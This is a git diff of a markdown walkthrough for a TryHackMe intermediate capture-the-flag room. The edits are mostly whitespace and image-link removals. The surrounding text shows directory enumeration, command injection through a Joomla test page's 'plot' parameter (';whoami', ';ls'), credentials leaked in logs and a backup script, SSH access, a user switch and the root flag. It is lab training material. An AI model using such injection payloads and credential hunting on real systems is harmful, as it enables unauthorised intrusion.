@@ -4,7 +4,6 @@ Intermediate level CTF
 
 ![](https://tryhackme-images.s3.amazonaws.com/room-icons/4a800c6513239dbdfaf74ce869a88add.jpeg)
 
-
 ###  Questions #1
 
  Start Machine
@@ -293,7 +292,6 @@ Progress: 4547 / 4615 (98.53%)==================================================
 2023/02/03 16:31:51 Finished
 ===============================================================
 
-
 http://10.10.242.217/joomla/administrator/index.php
 http://10.10.242.217/joomla/_files/
 
@@ -338,7 +336,6 @@ http://10.10.242.217/joomla/_test/index.php?plot=;whoami
 Select Host
 www-data
 
-
 http://10.10.242.217/joomla/_test/index.php?plot=;ls
 
 Select Host
@@ -351,7 +348,6 @@ inspect
 <select class="select_text" name="host" onchange="this.form.submit();"><option value="null" selected="">Select Host</option><option value="HPUX">HPUX</option><option value="Linux">Linux</option><option value="SunOS">SunOS</option><option value="Aug" 20="" 11:16:26="" parrot="" sshd[2443]:="" server="" listening="" on="" 0.0.0.0="" port="" 22.="">Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.</option><option value="Aug" 20="" 11:16:26="" parrot="" sshd[2443]:="" server="" listening="" on="" ::="" port="" 22.="">Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.</option><option value="Aug" 20="" 11:16:35="" parrot="" sshd[2451]:="" accepted="" password="" for="" basterd="" from="" 10.1.1.1="" port="" 49824="" ssh2="" #pass:="" superduperp@$$="">Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$</option>Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)<option value="Aug" 20="" 11:16:35="" parrot="" sshd[2451]:="" pam_unix(sshd:session):="" session="" opened="" for="" user="" pentest="" by="" (uid="0)"></option><option value="Aug" 20="" 11:16:36="" parrot="" sshd[2466]:="" received="" disconnect="" from="" 10.10.170.50="" port="" 49824:11:="" disconnected="" by="" user="">Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user</option><option value="Aug" 20="" 11:16:36="" parrot="" sshd[2466]:="" disconnected="" from="" user="" pentest="" 10.10.170.50="" port="" 49824="">Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 
 
 SSH
-
 
 basterd:superduperp@$$
 
@@ -371,7 +367,6 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
 
 8 packages can be updated.
 8 updates are security updates.
-
 
 Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
 $ whoami
@@ -397,7 +392,6 @@ USER=stoner
 #superduperp@$$no1knows
 
 ssh $USER@$REMOTE mkdir $TARGET/$DATE
-
 
 if [ -d "$SOURCE" ]; then
     for i in `ls $SOURCE | grep 'data'`;do
@@ -443,7 +437,6 @@ basterd@Vulnerable:~/.cache$ cat motd.legal-displayed
 
 USER=stoner
 #superduperp@$$no1knows
-
 
 basterd@Vulnerable:~/.cache$ su stoner
 Password: superduperp@$$no1knows
@@ -503,12 +496,7 @@ root.txt
 # cat root.txt
 It wasn't that hard, was it?
 
-
-
 ```
-
-![[Pasted image 20230203163820.png]]
-![[Pasted image 20230203164315.png]]
 
 File extension after anon login  
 
